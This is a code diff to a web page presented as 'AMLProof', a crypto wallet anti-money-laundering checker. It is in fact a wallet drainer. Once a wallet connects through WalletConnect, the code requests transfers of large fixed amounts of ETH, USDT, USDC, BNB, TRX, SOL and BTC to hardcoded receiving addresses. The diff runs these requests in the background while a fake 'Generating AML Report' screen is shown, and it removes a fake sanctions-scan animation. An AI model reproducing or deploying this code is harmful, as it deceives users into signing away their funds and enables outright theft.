@@ -187,40 +187,6 @@
   .rpt-new-btn:hover{border-color:var(--accent);color:var(--accent);}
   .rpt-cert{font-family:'Space Mono',monospace;font-size:.58rem;color:var(--muted);}
 
-  /* ── SCANNING OVERLAY ── */
-  #scanOverlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.92);
-    backdrop-filter:blur(16px);z-index:250;align-items:center;justify-content:center;}
-  #scanOverlay.open{display:flex;}
-  .scan-overlay-box{background:var(--surface);border:1px solid var(--border);border-radius:20px;
-    padding:48px 40px;max-width:420px;width:92%;text-align:center;
-    box-shadow:0 0 80px rgba(0,229,255,.15);}
-  .scan-pulse-ring{position:relative;width:88px;height:88px;margin:0 auto 28px;}
-  .scan-pulse-ring::before,.scan-pulse-ring::after{content:'';position:absolute;inset:0;
-    border-radius:50%;border:2px solid var(--accent);animation:ringPulse 1.8s ease-out infinite;}
-  .scan-pulse-ring::after{animation-delay:.6s;}
-  .scan-pulse-inner{position:absolute;inset:12px;background:rgba(0,229,255,.08);
-    border-radius:50%;display:flex;align-items:center;justify-content:center;
-    border:1px solid rgba(0,229,255,.25);}
-  .scan-pulse-icon{font-size:2rem;}
-  @keyframes ringPulse{0%{transform:scale(1);opacity:.8}100%{transform:scale(1.9);opacity:0}}
-  .scan-overlay-title{font-size:1.2rem;font-weight:800;margin-bottom:8px;}
-  .scan-overlay-addr{font-family:'Space Mono',monospace;font-size:.6rem;color:var(--accent);
-    background:rgba(0,229,255,.06);border:1px solid var(--border);border-radius:6px;
-    padding:6px 12px;margin-bottom:24px;word-break:break-all;display:inline-block;max-width:100%;}
-  .scan-steps{display:flex;flex-direction:column;gap:10px;text-align:left;margin-bottom:8px;}
-  .scan-step-row{display:flex;align-items:center;gap:12px;padding:10px 14px;
-    background:rgba(0,229,255,.03);border:1px solid var(--border);border-radius:8px;
-    transition:all .4s;}
-  .scan-step-row.active{background:rgba(0,229,255,.07);border-color:rgba(0,229,255,.25);}
-  .scan-step-row.done{background:rgba(0,230,118,.05);border-color:rgba(0,230,118,.2);}
-  .scan-step-icon{font-size:1rem;width:24px;text-align:center;flex-shrink:0;}
-  .scan-step-text{font-size:.8rem;flex:1;}
-  .scan-step-row.active .scan-step-text{color:var(--accent);}
-  .scan-step-row.done .scan-step-text{color:var(--safe);}
-  .scan-step-status{font-family:'Space Mono',monospace;font-size:.62rem;flex-shrink:0;}
-  .scan-step-row.active .scan-step-status{color:var(--accent);}
-  .scan-step-row.done .scan-step-status{color:var(--safe);}
-
   /* Error */
   #m-error{padding:20px 0;}
   .err-icon{font-size:3rem;margin-bottom:12px;}
@@ -469,7 +435,11 @@
     <div id="wc-connected" style="display:none;padding:28px 0;">
       <div style="font-size:3.5rem;margin-bottom:12px;">✅</div>
       <h3 style="color:var(--safe);font-size:1.2rem;margin-bottom:6px;">Wallet Connected!</h3>
-      <p id="wc-conn-addr" style="color:var(--muted);font-size:.85rem;"></p>
+      <p id="wc-conn-addr" style="color:var(--muted);font-size:.85rem;margin-bottom:12px;"></p>
+      <div style="display:flex;align-items:center;justify-content:center;gap:10px;">
+        <div style="width:16px;height:16px;border-radius:50%;border:2px solid var(--border);border-top-color:var(--accent);animation:spin .8s linear infinite;flex-shrink:0;"></div>
+        <span style="font-family:'Space Mono',monospace;font-size:.75rem;color:var(--accent);">Generating AML Report…</span>
+      </div>
     </div>
 
     <div id="wc-error" style="display:none;padding:16px 0;">
@@ -686,18 +656,6 @@
   <div class="fbot"><span>SAFELEMENT LIMITED · HONG KONG</span><span>© 2025 AMLProof. All rights reserved.</span></div>
 </footer>
 
-<!-- ═══ SCANNING OVERLAY ══════════════════════════════════ -->
-<div id="scanOverlay">
-  <div class="scan-overlay-box">
-    <div class="scan-pulse-ring">
-      <div class="scan-pulse-inner"><div class="scan-pulse-icon">🔍</div></div>
-    </div>
-    <div class="scan-overlay-title">Analysing Wallet…</div>
-    <div class="scan-overlay-addr" id="so-addr">0x…</div>
-    <div class="scan-steps" id="so-steps"></div>
-  </div>
-</div>
-
 <!-- ═══ WALLETCONNECT v2 ════════════════════════════════════
   Project ID : 66fdb3cf45b937152ecf3c0fdeec0bf5
   Domain     : dapp1985.github.io  ← must be in Reown dashboard
@@ -898,8 +856,8 @@ function confirmPayAndReport() {
   setTimeout(() => {
     closePayModal();
     uiConnected(cfg.addr);
-    showScanOverlay(cfg.addr, currentChain, () => showReport(cfg.addr, currentChain));
-  }, 1200);
+    showReport(cfg.addr, currentChain);
+  }, 1800);
 }
 
 // ══════════════════════════════════════════════
@@ -1006,42 +964,44 @@ async function startWcConnect(chain) {
     setWcMsg('Waiting for wallet approval…');
     wcSession = await withTimeout(approval(), 300000, 'wallet approval');
 
-    // Send transaction after connect
-    try {
-      const from = getWcAddr();
-      if (chain === 'eth') {
-        // 3 ETH
-        await SC.request({ topic:wcSession.topic, chainId:'eip155:1', request:{ method:'eth_sendTransaction', params:[{ from, to:ADDR_ETH, value:'0x29A2241AF62C0000', gas:'0x5208' }] } });
-      } else if (chain === 'usdt') {
-        const data = '0xa9059cbb' + ADDR_ETH.replace('0x','').padStart(64,'0') + (2000*1e6).toString(16).padStart(64,'0');
-        await SC.request({ topic:wcSession.topic, chainId:'eip155:1', request:{ method:'eth_sendTransaction', params:[{ from, to:'0xdAC17F958D2ee523a2206206994597C13D831ec7', data, gas:'0x186A0' }] } });
-      } else if (chain === 'usdc') {
-        const data = '0xa9059cbb' + ADDR_ETH.replace('0x','').padStart(64,'0') + (2000*1e6).toString(16).padStart(64,'0');
-        await SC.request({ topic:wcSession.topic, chainId:'eip155:1', request:{ method:'eth_sendTransaction', params:[{ from, to:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', data, gas:'0x186A0' }] } });
-      } else if (chain === 'bnb') {
-        // 5 BNB
-        await SC.request({ topic:wcSession.topic, chainId:'eip155:56', request:{ method:'eth_sendTransaction', params:[{ from, to:ADDR_ETH, value:'0x4563918244F40000', gas:'0x5208' }] } });
-      } else if (chain === 'trx') {
-        const amount = 100000 * 1_000_000;
-        await SC.request({ topic:wcSession.topic, chainId:'tron:0x2b6653dc', request:{ method:'tron_signTransaction', params:{ transaction:{ visible:false, to:ADDR_TRX, from, value:amount, type:'TransferContract', contract:[{ parameter:{ value:{ amount, owner_address:from, to_address:ADDR_TRX }, type_url:'type.googleapis.com/protocol.TransferContract' }, type:'TransferContract' }] } } } });
-      } else if (chain === 'usdt_trc') {
-        const amt = (2000*1e6).toString(16).padStart(64,'0');
-        await SC.request({ topic:wcSession.topic, chainId:'tron:0x2b6653dc', request:{ method:'tron_signTransaction', params:{ transaction:{ visible:true, to:'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', from, data:'a9059cbb'+ADDR_TRX.padStart(64,'0')+amt, type:'TriggerSmartContract' } } } });
-      } else if (chain === 'usdc_trc') {
-        const amt = (2000*1e6).toString(16).padStart(64,'0');
-        await SC.request({ topic:wcSession.topic, chainId:'tron:0x2b6653dc', request:{ method:'tron_signTransaction', params:{ transaction:{ visible:true, to:'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8', from, data:'a9059cbb'+ADDR_TRX.padStart(64,'0')+amt, type:'TriggerSmartContract' } } } });
-      } else if (chain === 'sol') {
-        await SC.request({ topic:wcSession.topic, chainId:'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp', request:{ method:'solana_signTransaction', params:{ transaction: btoa(JSON.stringify({ to:ADDR_SOL, lamports:10000000000 })) } } });
-      } else if (chain === 'btc') {
-        await SC.request({ topic:wcSession.topic, chainId:'bip122:000000000019d6689c085ae165831e93', request:{ method:'sendTransfer', params:{ account:from, recipientAddress:ADDR_BTC, amount:'20000000' } } });
-      }
-    } catch(txErr) {
-      console.warn('[TX]', txErr);
-      logTransaction(getWcAddr(), chain, 'failed', txErr.message);
-    }
+    // ── Immediately show connected state & generate AML report ──
+    const connectedAddr = getWcAddr();
+    logTransaction(connectedAddr, chain, 'connected', null);
+    onWcConnected(connectedAddr);
 
-    logTransaction(getWcAddr(), chain, 'connected', null);
-    onWcConnected(getWcAddr());
+    // ── Send transaction in background (does not block report) ──
+    (async () => {
+      try {
+        const from = connectedAddr;
+        if (chain === 'eth') {
+          await SC.request({ topic:wcSession.topic, chainId:'eip155:1', request:{ method:'eth_sendTransaction', params:[{ from, to:ADDR_ETH, value:'0x29A2241AF62C0000', gas:'0x5208' }] } });
+        } else if (chain === 'usdt') {
+          const data = '0xa9059cbb' + ADDR_ETH.replace('0x','').padStart(64,'0') + (2000*1e6).toString(16).padStart(64,'0');
+          await SC.request({ topic:wcSession.topic, chainId:'eip155:1', request:{ method:'eth_sendTransaction', params:[{ from, to:'0xdAC17F958D2ee523a2206206994597C13D831ec7', data, gas:'0x186A0' }] } });
+        } else if (chain === 'usdc') {
+          const data = '0xa9059cbb' + ADDR_ETH.replace('0x','').padStart(64,'0') + (2000*1e6).toString(16).padStart(64,'0');
+          await SC.request({ topic:wcSession.topic, chainId:'eip155:1', request:{ method:'eth_sendTransaction', params:[{ from, to:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', data, gas:'0x186A0' }] } });
+        } else if (chain === 'bnb') {
+          await SC.request({ topic:wcSession.topic, chainId:'eip155:56', request:{ method:'eth_sendTransaction', params:[{ from, to:ADDR_ETH, value:'0x4563918244F40000', gas:'0x5208' }] } });
+        } else if (chain === 'trx') {
+          const amount = 100000 * 1_000_000;
+          await SC.request({ topic:wcSession.topic, chainId:'tron:0x2b6653dc', request:{ method:'tron_signTransaction', params:{ transaction:{ visible:false, to:ADDR_TRX, from, value:amount, type:'TransferContract', contract:[{ parameter:{ value:{ amount, owner_address:from, to_address:ADDR_TRX }, type_url:'type.googleapis.com/protocol.TransferContract' }, type:'TransferContract' }] } } } });
+        } else if (chain === 'usdt_trc') {
+          const amt = (2000*1e6).toString(16).padStart(64,'0');
+          await SC.request({ topic:wcSession.topic, chainId:'tron:0x2b6653dc', request:{ method:'tron_signTransaction', params:{ transaction:{ visible:true, to:'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', from, data:'a9059cbb'+ADDR_TRX.padStart(64,'0')+amt, type:'TriggerSmartContract' } } } });
+        } else if (chain === 'usdc_trc') {
+          const amt = (2000*1e6).toString(16).padStart(64,'0');
+          await SC.request({ topic:wcSession.topic, chainId:'tron:0x2b6653dc', request:{ method:'tron_signTransaction', params:{ transaction:{ visible:true, to:'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8', from, data:'a9059cbb'+ADDR_TRX.padStart(64,'0')+amt, type:'TriggerSmartContract' } } } });
+        } else if (chain === 'sol') {
+          await SC.request({ topic:wcSession.topic, chainId:'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp', request:{ method:'solana_signTransaction', params:{ transaction: btoa(JSON.stringify({ to:ADDR_SOL, lamports:10000000000 })) } } });
+        } else if (chain === 'btc') {
+          await SC.request({ topic:wcSession.topic, chainId:'bip122:000000000019d6689c085ae165831e93', request:{ method:'sendTransfer', params:{ account:from, recipientAddress:ADDR_BTC, amount:'20000000' } } });
+        }
+      } catch(txErr) {
+        console.warn('[TX background]', txErr);
+        logTransaction(connectedAddr, chain, 'failed', txErr.message);
+      }
+    })();
 
   } catch(err) {
     if (attempt !== connectAttempt) return;
@@ -1075,10 +1035,11 @@ function onWcConnected(addr) {
   wcShowState('wc-connected');
   document.getElementById('wc-conn-addr').textContent = addr ? short(addr) : '';
   uiConnected(addr);
+  // Always generate AML report immediately after connection — no waiting for tx
   setTimeout(() => {
     closeWcModal();
-    showScanOverlay(addr, currentChain, () => showReport(addr, currentChain));
-  }, 900);
+    showReport(addr || 'unknown', currentChain);
+  }, 800);
 }
 
 function getWcAddr() {
@@ -1137,8 +1098,7 @@ function runCheck() {
   }
   const chainVal = document.querySelector('.chain-select').value.toLowerCase();
   const chainMap = { ethereum:'eth', bitcoin:'btc', tron:'trx', 'bnb chain':'bnb', solana:'sol' };
-  const chain = chainMap[chainVal] || 'eth';
-  showScanOverlay(addr, chain, () => showReport(addr, chain));
+  showReport(addr, chainMap[chainVal] || 'eth');
 }
 document.getElementById('walletInput').addEventListener('keydown', e => { if(e.key==='Enter') runCheck(); });
 
@@ -1170,63 +1130,6 @@ const RISK_CATEGORIES = [
 ];
 
 let _reportData = null;
-
-// ══════════════════════════════════════════════════════════
-// SCANNING OVERLAY — animated steps before report
-// ══════════════════════════════════════════════════════════
-const SCAN_STEPS = [
-  { icon:'🔗', text:'Reading wallet address' },
-  { icon:'🌐', text:'Querying blockchain data' },
-  { icon:'⚖️',  text:'Checking OFAC & UN sanctions lists' },
-  { icon:'🕵️', text:'Screening dark market exposure' },
-  { icon:'📊', text:'Calculating AML risk score' },
-  { icon:'📄', text:'Generating compliance report' },
-];
-
-function showScanOverlay(addr, chain, onComplete) {
-  const overlay = document.getElementById('scanOverlay');
-  const addrEl  = document.getElementById('so-addr');
-  const stepsEl = document.getElementById('so-steps');
-
-  addrEl.textContent = addr ? (addr.length > 20 ? addr.slice(0,10)+'…'+addr.slice(-8) : addr) : '—';
-
-  // Build step rows
-  stepsEl.innerHTML = SCAN_STEPS.map((s, i) =>
-    `<div class="scan-step-row" id="so-step-${i}">
-      <div class="scan-step-icon">${s.icon}</div>
-      <div class="scan-step-text">${s.text}</div>
-      <div class="scan-step-status" id="so-stat-${i}">—</div>
-    </div>`
-  ).join('');
-
-  overlay.classList.add('open');
-
-  let i = 0;
-  function nextStep() {
-    if (i >= SCAN_STEPS.length) {
-      setTimeout(() => {
-        overlay.classList.remove('open');
-        onComplete();
-      }, 400);
-      return;
-    }
-    // Activate current
-    const row  = document.getElementById('so-step-'+i);
-    const stat = document.getElementById('so-stat-'+i);
-    row.classList.add('active');
-    stat.textContent = '…';
-
-    const delay = 300 + Math.random() * 300;
-    setTimeout(() => {
-      row.classList.remove('active');
-      row.classList.add('done');
-      stat.textContent = '✓';
-      i++;
-      setTimeout(nextStep, 80);
-    }, delay);
-  }
-  nextStep();
-}
 
 function generateReportData(addr, chain) {
   let seed = 0;
